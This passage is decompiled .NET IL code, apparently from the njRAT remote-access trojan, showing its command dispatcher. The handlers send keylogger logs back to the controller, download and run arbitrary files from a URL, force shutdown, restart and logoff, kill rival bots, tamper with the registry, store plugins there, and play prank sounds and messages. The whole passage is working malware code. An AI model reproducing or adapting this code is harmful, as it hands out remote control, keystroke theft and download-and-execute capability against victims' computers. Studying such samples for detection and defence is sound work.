        IL_17d7:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_Image(class [System.Drawing]System.Drawing.Image)
        IL_17dc:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_17e1:  leave.s    IL_17f2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_17e3:  dup
        IL_17e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_17e9:  stloc.s    V_132
        IL_17eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17f0:  leave.s    IL_17f2

      }  // end handler
      IL_17f2:  leave      IL_26c9

      IL_17f7:  nop
      .try
      {
        IL_17f8:  ldnull
        IL_17f9:  stloc.s    V_133
        IL_17fb:  ldloc.3
        IL_17fc:  ldc.i4.2
        IL_17fd:  ldelem.ref
        IL_17fe:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_1803:  ldc.i4.0
        IL_1804:  stloc.s    V_128
        IL_1806:  ldloca.s   V_128
        IL_1808:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_180d:  stloc.s    V_133
        IL_180f:  ldstr      "temp"
        IL_1814:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_1819:  ldstr      "\\scream.wav"
        IL_181e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1823:  ldloc.s    V_133
        IL_1825:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_182a:  ldstr      "SoundUp"
        IL_182f:  call       bool j.OK::Send(string)
        IL_1834:  pop
        IL_1835:  leave.s    IL_1846

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1837:  dup
        IL_1838:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_183d:  stloc.s    V_134
        IL_183f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1844:  leave.s    IL_1846

      }  // end handler
      IL_1846:  leave      IL_26c9

      IL_184b:  ldc.i4.0
      IL_184c:  stloc.s    V_135
      IL_184e:  ldc.i4.0
      IL_184f:  stloc.s    V_136
      IL_1851:  ldloc.0
      IL_1852:  ldc.i4.1
      IL_1853:  ldelem.ref
      IL_1854:  stloc.s    V_137
      IL_1856:  ldloc.s    V_137
      IL_1858:  ldstr      "Error"
      IL_185d:  ldc.i4.0
      IL_185e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1863:  brtrue.s   IL_186b

      IL_1865:  ldc.i4.s   64
      IL_1867:  stloc.s    V_136
      IL_1869:  br.s       IL_18a8

      IL_186b:  ldloc.s    V_137
      IL_186d:  ldstr      "Question"
      IL_1872:  ldc.i4.0
      IL_1873:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1878:  brtrue.s   IL_1880

      IL_187a:  ldc.i4.s   32
      IL_187c:  stloc.s    V_136
      IL_187e:  br.s       IL_18a8

      IL_1880:  ldloc.s    V_137
      IL_1882:  ldstr      "Warning"
      IL_1887:  ldc.i4.0
      IL_1888:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_188d:  brtrue.s   IL_1895

      IL_188f:  ldc.i4.s   48
      IL_1891:  stloc.s    V_136
      IL_1893:  br.s       IL_18a8

      IL_1895:  ldloc.s    V_137
      IL_1897:  ldstr      "Info"
      IL_189c:  ldc.i4.0
      IL_189d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18a2:  brtrue.s   IL_18a8

      IL_18a4:  ldc.i4.s   16
      IL_18a6:  stloc.s    V_136
      IL_18a8:  ldloc.0
      IL_18a9:  ldc.i4.2
      IL_18aa:  ldelem.ref
      IL_18ab:  stloc.s    V_138
      IL_18ad:  ldloc.s    V_138
      IL_18af:  ldstr      "YesNo"
      IL_18b4:  ldc.i4.0
      IL_18b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18ba:  brtrue.s   IL_18c1

      IL_18bc:  ldc.i4.4
      IL_18bd:  stloc.s    V_135
      IL_18bf:  br.s       IL_1923

      IL_18c1:  ldloc.s    V_138
      IL_18c3:  ldstr      "YesNoCancel"
      IL_18c8:  ldc.i4.0
      IL_18c9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18ce:  brtrue.s   IL_18d5

      IL_18d0:  ldc.i4.3
      IL_18d1:  stloc.s    V_135
      IL_18d3:  br.s       IL_1923

      IL_18d5:  ldloc.s    V_138
      IL_18d7:  ldstr      "OK"
      IL_18dc:  ldc.i4.0
      IL_18dd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18e2:  brtrue.s   IL_18e9

      IL_18e4:  ldc.i4.0
      IL_18e5:  stloc.s    V_135
      IL_18e7:  br.s       IL_1923

      IL_18e9:  ldloc.s    V_138
      IL_18eb:  ldstr      "OKCancel"
      IL_18f0:  ldc.i4.0
      IL_18f1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18f6:  brtrue.s   IL_18fd

      IL_18f8:  ldc.i4.1
      IL_18f9:  stloc.s    V_135
      IL_18fb:  br.s       IL_1923

      IL_18fd:  ldloc.s    V_138
      IL_18ff:  ldstr      "RetryCancel"
      IL_1904:  ldc.i4.0
      IL_1905:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_190a:  brtrue.s   IL_1911

      IL_190c:  ldc.i4.5
      IL_190d:  stloc.s    V_135
      IL_190f:  br.s       IL_1923

      IL_1911:  ldloc.s    V_138
      IL_1913:  ldstr      "AbortRetryCancel"
      IL_1918:  ldc.i4.0
      IL_1919:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_191e:  brtrue.s   IL_1923

      IL_1920:  ldc.i4.2
      IL_1921:  stloc.s    V_135
      IL_1923:  ldloc.0
      IL_1924:  ldc.i4.4
      IL_1925:  ldelem.ref
      IL_1926:  ldloc.0
      IL_1927:  ldc.i4.3
      IL_1928:  ldelem.ref
      IL_1929:  ldloc.s    V_135
      IL_192b:  ldloc.s    V_136
      IL_192d:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_1932:  pop
      IL_1933:  leave      IL_26c9

      IL_1938:  ldstr      "SAPI.spvoice"
      IL_193d:  ldstr      ""
      IL_1942:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_1947:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_194c:  ldnull
      IL_194d:  ldstr      "speak"
      IL_1952:  ldc.i4.1
      IL_1953:  newarr     [mscorlib]System.Object
      IL_1958:  dup
      IL_1959:  ldc.i4.0
      IL_195a:  ldc.i4.1
      IL_195b:  newarr     [mscorlib]System.String
      IL_1960:  dup
      IL_1961:  ldc.i4.0
      IL_1962:  ldloc.0
      IL_1963:  ldc.i4.1
      IL_1964:  ldelem.ref
      IL_1965:  stelem.ref
      IL_1966:  call       string [mscorlib]System.String::Concat(string[])
      IL_196b:  stelem.ref
      IL_196c:  ldnull
      IL_196d:  ldnull
      IL_196e:  ldnull
      IL_196f:  ldc.i4.1
      IL_1970:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1975:  pop
      IL_1976:  leave      IL_26c9

      IL_197b:  ldstr      "fun"
      IL_1980:  call       bool j.OK::Send(string)
      IL_1985:  pop
      IL_1986:  leave      IL_26c9

      IL_198b:  ldc.i4.1
      IL_198c:  newarr     [mscorlib]System.String
      IL_1991:  dup
      IL_1992:  ldc.i4.0
      IL_1993:  ldloc.0
      IL_1994:  ldc.i4.1
      IL_1995:  ldelem.ref
      IL_1996:  stelem.ref
      IL_1997:  call       string [mscorlib]System.String::Concat(string[])
      IL_199c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_19a1:  ldstr      "300"
      IL_19a6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_19ab:  call       void j.OK::Beep(int32,
                                           int32)
      IL_19b0:  leave      IL_26c9

      IL_19b5:  ldstr      "Shutdown"
      IL_19ba:  ldstr      "/s /t 00"
      IL_19bf:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_19c4:  pop
      IL_19c5:  leave      IL_26c9

      IL_19ca:  ldstr      "Shutdown"
      IL_19cf:  ldstr      "/r /t 00"
      IL_19d4:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_19d9:  pop
      IL_19da:  leave      IL_26c9

      IL_19df:  ldstr      "Shutdown"
      IL_19e4:  ldstr      "/l /f"
      IL_19e9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_19ee:  pop
      IL_19ef:  leave      IL_26c9

      IL_19f4:  call       void BotKillers::RunStandardBotKiller()
      IL_19f9:  leave      IL_26c9

      IL_19fe:  ldstr      "on"
      IL_1a03:  stsfld     string j.OK::WINMIN
      IL_1a08:  leave      IL_26c9

      IL_1a0d:  ldstr      "off"
      IL_1a12:  stsfld     string j.OK::WINMIN
      IL_1a17:  leave      IL_26c9

      IL_1a1c:  ldstr      "on"
      IL_1a21:  stsfld     string j.OK::SCREAM
      IL_1a26:  leave      IL_26c9

      IL_1a2b:  ldstr      "off"
      IL_1a30:  stsfld     string j.OK::SCREAM
      IL_1a35:  leave      IL_26c9

      IL_1a3a:  ldc.i4.0
      IL_1a3b:  stsfld     bool j.OK::Cn
      IL_1a40:  leave      IL_26c9

      IL_1a45:  ldstr      "kl"
      IL_1a4a:  ldsfld     string j.OK::Y
      IL_1a4f:  ldsfld     class j.kl j.OK::kq
      IL_1a54:  ldflda     string j.kl::Logs
      IL_1a59:  call       string j.OK::ENB(string&)
      IL_1a5e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1a63:  call       bool j.OK::Send(string)
      IL_1a68:  pop
      IL_1a69:  leave      IL_26c9

      IL_1a6e:  ldloc.0
      IL_1a6f:  ldc.i4.1
      IL_1a70:  ldelem.ref
      IL_1a71:  stloc.s    V_139
      IL_1a73:  ldloc.s    V_139
      IL_1a75:  ldstr      "~"
      IL_1a7a:  ldc.i4.0
      IL_1a7b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a80:  brfalse.s  IL_1aa2

      IL_1a82:  ldloc.s    V_139
      IL_1a84:  ldstr      "!"
      IL_1a89:  ldc.i4.0
      IL_1a8a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a8f:  brfalse.s  IL_1ab1

      IL_1a91:  ldloc.s    V_139
      IL_1a93:  ldstr      "@"
      IL_1a98:  ldc.i4.0
      IL_1a99:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1a9e:  brfalse.s  IL_1afe

      IL_1aa0:  br.s       IL_1b06

      IL_1aa2:  ldloc.0
      IL_1aa3:  ldc.i4.2
      IL_1aa4:  ldelem.ref
      IL_1aa5:  ldloc.0
      IL_1aa6:  ldc.i4.3
      IL_1aa7:  ldelem.ref
      IL_1aa8:  ldc.i4.1
      IL_1aa9:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1aae:  pop
      IL_1aaf:  br.s       IL_1b06

      IL_1ab1:  ldloc.0
      IL_1ab2:  ldc.i4.2
      IL_1ab3:  ldelem.ref
      IL_1ab4:  ldloc.0
      IL_1ab5:  ldc.i4.3
      IL_1ab6:  ldelem.ref
      IL_1ab7:  ldc.i4.1
      IL_1ab8:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1abd:  pop
      IL_1abe:  ldstr      "getvalue"
      IL_1ac3:  ldsfld     string j.OK::Y
      IL_1ac8:  ldloc.0
      IL_1ac9:  ldc.i4.1
      IL_1aca:  ldelem.ref
      IL_1acb:  ldsfld     string j.OK::Y
      IL_1ad0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1ad5:  ldloc.0
      IL_1ad6:  ldc.i4.1
      IL_1ad7:  ldelem.ref
      IL_1ad8:  ldstr      ""
      IL_1add:  call       object j.OK::GTV(string,
                                            object)
      IL_1ae2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1ae7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_1aec:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1af1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_1af6:  call       bool j.OK::Send(string)
      IL_1afb:  pop
      IL_1afc:  br.s       IL_1b06

      IL_1afe:  ldloc.0
      IL_1aff:  ldc.i4.2
      IL_1b00:  ldelem.ref
      IL_1b01:  call       void j.OK::DLV(string)
      IL_1b06:  leave      IL_26c9

      IL_1b0b:  ldloc.2
      IL_1b0c:  ldstr      "rn"
      IL_1b11:  ldc.i4.0
      IL_1b12:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1b17:  brtrue     IL_1cc6

      IL_1b1c:  ldloc.0
      IL_1b1d:  ldc.i4.2
      IL_1b1e:  ldelem.ref
      IL_1b1f:  ldc.i4.0
      IL_1b20:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_1b25:  ldc.i4.s   31
      IL_1b27:  bne.un     IL_1baf

      .try
      {
        IL_1b2c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_1b31:  ldloc.0
        IL_1b32:  ldc.i4.0
        IL_1b33:  ldelem.ref
        IL_1b34:  ldsfld     string j.OK::Y
        IL_1b39:  ldloc.0
        IL_1b3a:  ldc.i4.1
        IL_1b3b:  ldelem.ref
        IL_1b3c:  ldsfld     string j.OK::Y
        IL_1b41:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1b46:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_1b4b:  stloc.s    V_140
        IL_1b4d:  dup
        IL_1b4e:  ldarg.0
        IL_1b4f:  ldloc.s    V_140
        IL_1b51:  ldarg.0
        IL_1b52:  ldlen
        IL_1b53:  conv.i4
        IL_1b54:  ldloc.s    V_140
        IL_1b56:  sub.ovf
        IL_1b57:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_1b5c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1b61:  call       uint8[] j.OK::ZIP(uint8[])
        IL_1b66:  stloc.1
        IL_1b67:  leave      IL_1c06

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1b6c:  dup
        IL_1b6d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1b72:  stloc.s    V_141
        IL_1b74:  ldloc.s    V_141
        IL_1b76:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1b7b:  ldstr      "MSG"
        IL_1b80:  ldsfld     string j.OK::Y
        IL_1b85:  ldstr      "Execute ERROR"
        IL_1b8a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1b8f:  call       bool j.OK::Send(string)
        IL_1b94:  pop
        IL_1b95:  ldstr      "bla"
        IL_1b9a:  call       bool j.OK::Send(string)
        IL_1b9f:  pop
        IL_1ba0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1ba5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1baa:  leave      IL_26c9

      }  // end handler
      IL_1baf:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_1bb4:  stloc.s    V_4
      .try
      {
        IL_1bb6:  ldloc.s    V_4
        IL_1bb8:  ldloc.0
        IL_1bb9:  ldc.i4.2
        IL_1bba:  ldelem.ref
        IL_1bbb:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1bc0:  stloc.1
        IL_1bc1:  leave.s    IL_1c06

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1bc3:  dup
        IL_1bc4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1bc9:  stloc.s    V_142
        IL_1bcb:  ldloc.s    V_142
        IL_1bcd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1bd2:  ldstr      "MSG"
        IL_1bd7:  ldsfld     string j.OK::Y
        IL_1bdc:  ldstr      "Download ERROR"
        IL_1be1:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1be6:  call       bool j.OK::Send(string)
        IL_1beb:  pop
        IL_1bec:  ldstr      "bla"
        IL_1bf1:  call       bool j.OK::Send(string)
        IL_1bf6:  pop
        IL_1bf7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1bfc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1c01:  leave      IL_26c9

      }  // end handler
      IL_1c06:  ldstr      "bla"
      IL_1c0b:  call       bool j.OK::Send(string)
      IL_1c10:  pop
      IL_1c11:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1c16:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_1c1b:  stloc.s    V_143
      IL_1c1d:  ldloca.s   V_143
      IL_1c1f:  constrained. [mscorlib]System.Guid
      IL_1c25:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_1c2a:  ldstr      "-"
      IL_1c2f:  ldstr      ""
      IL_1c34:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_1c39:  ldstr      "."
      IL_1c3e:  ldloc.0
      IL_1c3f:  ldc.i4.1
      IL_1c40:  ldelem.ref
      IL_1c41:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_1c46:  stloc.s    V_5
      .try
      {
        IL_1c48:  ldloc.s    V_5
        IL_1c4a:  ldloc.1
        IL_1c4b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1c50:  ldloc.s    V_5
        IL_1c52:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_1c57:  pop
        IL_1c58:  ldstr      "MSG"
        IL_1c5d:  ldsfld     string j.OK::Y
        IL_1c62:  ldstr      "Executed As "
        IL_1c67:  ldloc.s    V_5
        IL_1c69:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_1c6e:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_1c73:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1c78:  call       bool j.OK::Send(string)
        IL_1c7d:  pop
        IL_1c7e:  leave      IL_26c9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1c83:  dup
        IL_1c84:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1c89:  stloc.s    V_144
        IL_1c8b:  ldloc.s    V_144
        IL_1c8d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1c92:  ldloc.s    V_144
        IL_1c94:  stloc.s    V_145
        IL_1c96:  ldstr      "MSG"
        IL_1c9b:  ldsfld     string j.OK::Y
        IL_1ca0:  ldstr      "Execute ERROR "
        IL_1ca5:  ldloc.s    V_145
        IL_1ca7:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1cac:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1cb1:  call       bool j.OK::Send(string)
        IL_1cb6:  pop
        IL_1cb7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1cbc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1cc1:  leave      IL_26c9

      }  // end handler
      IL_1cc6:  ldloc.2
      IL_1cc7:  ldstr      "inv"
      IL_1ccc:  ldc.i4.0
      IL_1ccd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1cd2:  brfalse.s  IL_1d0c

      IL_1cd4:  ldloc.2
      IL_1cd5:  ldstr      "ret"
      IL_1cda:  ldc.i4.0
      IL_1cdb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1ce0:  brfalse    IL_1f3d

      IL_1ce5:  ldloc.2
      IL_1ce6:  ldstr      "CAP"
      IL_1ceb:  ldc.i4.0
      IL_1cec:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1cf1:  brfalse    IL_20ae

      IL_1cf6:  ldloc.2
      IL_1cf7:  ldstr      "un"
      IL_1cfc:  ldc.i4.0
      IL_1cfd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1d02:  brfalse    IL_2250

      IL_1d07:  br         IL_22b8

      IL_1d0c:  ldloc.0
      IL_1d0d:  ldc.i4.1
      IL_1d0e:  ldelem.ref
      IL_1d0f:  ldc.i4.0
      IL_1d10:  newarr     [mscorlib]System.Byte
      IL_1d15:  call       object j.OK::GTV(string,
                                            object)
      IL_1d1a:  castclass  uint8[]
      IL_1d1f:  stloc.s    V_146
      IL_1d21:  ldloc.0
      IL_1d22:  ldc.i4.3
      IL_1d23:  ldelem.ref
      IL_1d24:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1d29:  ldc.i4.s   10
      IL_1d2b:  clt
      IL_1d2d:  ldloc.s    V_146
      IL_1d2f:  ldlen
      IL_1d30:  conv.i4
      IL_1d31:  ldc.i4.0
      IL_1d32:  ceq
      IL_1d34:  and
      IL_1d35:  brfalse.s  IL_1d74

      IL_1d37:  ldc.i4.5
      IL_1d38:  newarr     [mscorlib]System.String
      IL_1d3d:  dup
      IL_1d3e:  ldc.i4.0
      IL_1d3f:  ldstr      "pl"
      IL_1d44:  stelem.ref
      IL_1d45:  dup
      IL_1d46:  ldc.i4.1
      IL_1d47:  ldsfld     string j.OK::Y
      IL_1d4c:  stelem.ref
      IL_1d4d:  dup
      IL_1d4e:  ldc.i4.2
      IL_1d4f:  ldloc.0
      IL_1d50:  ldc.i4.1
      IL_1d51:  ldelem.ref
      IL_1d52:  stelem.ref
      IL_1d53:  dup
      IL_1d54:  ldc.i4.3
      IL_1d55:  ldsfld     string j.OK::Y
      IL_1d5a:  stelem.ref
      IL_1d5b:  dup
      IL_1d5c:  ldc.i4.4
      IL_1d5d:  ldc.i4.1
      IL_1d5e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1d63:  stelem.ref
      IL_1d64:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d69:  call       bool j.OK::Send(string)
      IL_1d6e:  pop
      IL_1d6f:  br         IL_1f38

      IL_1d74:  ldloc.0
      IL_1d75:  ldc.i4.3
      IL_1d76:  ldelem.ref
      IL_1d77:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1d7c:  ldc.i4.s   10
      IL_1d7e:  ble.s      IL_1ded

      IL_1d80:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1d85:  stloc.s    V_148
      IL_1d87:  ldc.i4.6
      IL_1d88:  newarr     [mscorlib]System.String
      IL_1d8d:  dup
      IL_1d8e:  ldc.i4.0
      IL_1d8f:  ldloc.0
      IL_1d90:  ldc.i4.0
      IL_1d91:  ldelem.ref
      IL_1d92:  stelem.ref
      IL_1d93:  dup
      IL_1d94:  ldc.i4.1
      IL_1d95:  ldsfld     string j.OK::Y
      IL_1d9a:  stelem.ref
      IL_1d9b:  dup
      IL_1d9c:  ldc.i4.2
      IL_1d9d:  ldloc.0
      IL_1d9e:  ldc.i4.1
      IL_1d9f:  ldelem.ref
      IL_1da0:  stelem.ref
      IL_1da1:  dup
      IL_1da2:  ldc.i4.3
      IL_1da3:  ldsfld     string j.OK::Y
      IL_1da8:  stelem.ref
      IL_1da9:  dup
      IL_1daa:  ldc.i4.4
      IL_1dab:  ldloc.0
      IL_1dac:  ldc.i4.2
      IL_1dad:  ldelem.ref
      IL_1dae:  stelem.ref
      IL_1daf:  dup
      IL_1db0:  ldc.i4.5
      IL_1db1:  ldsfld     string j.OK::Y
      IL_1db6:  stelem.ref
      IL_1db7:  call       string [mscorlib]System.String::Concat(string[])
      IL_1dbc:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1dc1:  stloc.s    V_149
      IL_1dc3:  ldloc.s    V_148
      IL_1dc5:  ldarg.0
      IL_1dc6:  ldloc.s    V_149
      IL_1dc8:  ldarg.0
      IL_1dc9:  ldlen
      IL_1dca:  conv.i4
      IL_1dcb:  ldloc.s    V_149
      IL_1dcd:  sub.ovf
      IL_1dce:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_1dd3:  ldloc.s    V_148
      IL_1dd5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1dda:  call       uint8[] j.OK::ZIP(uint8[])
      IL_1ddf:  stloc.s    V_146
      IL_1de1:  ldloc.0
      IL_1de2:  ldc.i4.1
      IL_1de3:  ldelem.ref
      IL_1de4:  ldloc.s    V_146
      IL_1de6:  ldc.i4.3
      IL_1de7:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_1dec:  pop
      IL_1ded:  ldc.i4.5
      IL_1dee:  newarr     [mscorlib]System.String
      IL_1df3:  dup
      IL_1df4:  ldc.i4.0
      IL_1df5:  ldstr      "pl"
      IL_1dfa:  stelem.ref
      IL_1dfb:  dup
      IL_1dfc:  ldc.i4.1
      IL_1dfd:  ldsfld     string j.OK::Y
      IL_1e02:  stelem.ref
      IL_1e03:  dup
      IL_1e04:  ldc.i4.2
      IL_1e05:  ldloc.0
      IL_1e06:  ldc.i4.1
      IL_1e07:  ldelem.ref
      IL_1e08:  stelem.ref
      IL_1e09:  dup
      IL_1e0a:  ldc.i4.3
      IL_1e0b:  ldsfld     string j.OK::Y
      IL_1e10:  stelem.ref
      IL_1e11:  dup
      IL_1e12:  ldc.i4.4
      IL_1e13:  ldc.i4.0
      IL_1e14:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1e19:  stelem.ref
      IL_1e1a:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e1f:  call       bool j.OK::Send(string)
      IL_1e24:  pop
